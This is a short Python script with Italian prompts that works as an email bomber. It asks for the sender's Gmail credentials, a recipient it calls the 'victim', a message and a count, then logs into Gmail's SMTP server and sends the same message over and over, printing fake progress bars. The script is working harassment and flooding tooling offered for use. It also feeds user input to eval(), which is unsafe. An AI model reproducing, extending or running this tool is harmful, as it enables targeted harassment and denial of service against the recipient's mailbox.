import sys
import smtplib

print("""    ______________________
            | made by  @antares775 |
            |______________________|
                                       """)
print("ok iniziamo")

email = raw_input("ok per iniziare scrivimi la tua mail ---- ")
password = raw_input("ora la tua password---- ")
destinatario = raw_input("abbiamo qausi finito, scrivi la mail del destinatario!---- ")
msg = raw_input("ora scrivi il messaggio che vuoi mandare a questo cazzone per bombardargli la posta ---- ")
numeromail1 = eval(raw_input("ultimo passaggio, quante mail vuoi inviare alla vittima  -----  "))

try :
    for x in range(1, numeromail1+1):
      server = smtplib.SMTP("smtp.gmail.com",587)
      server.starttls()
      server.login(email, password)
      server.sendmail(email, destinatario, msg)
      print("sto mandando le mail....")
      print("... 1% ....")
      print("....10% ...")
      print("....25% ...")
      print("....37% ...")
      print("....60% ...")
      print("....79% ...")
      print("....100% ...") 
      print("ho inviato il messaggio" + str(x))
    server.quit()  
except KeyboardInterrupt :
    print("sto interrompendo...")
    print("interrotto corretamente!")
    sys.exit()



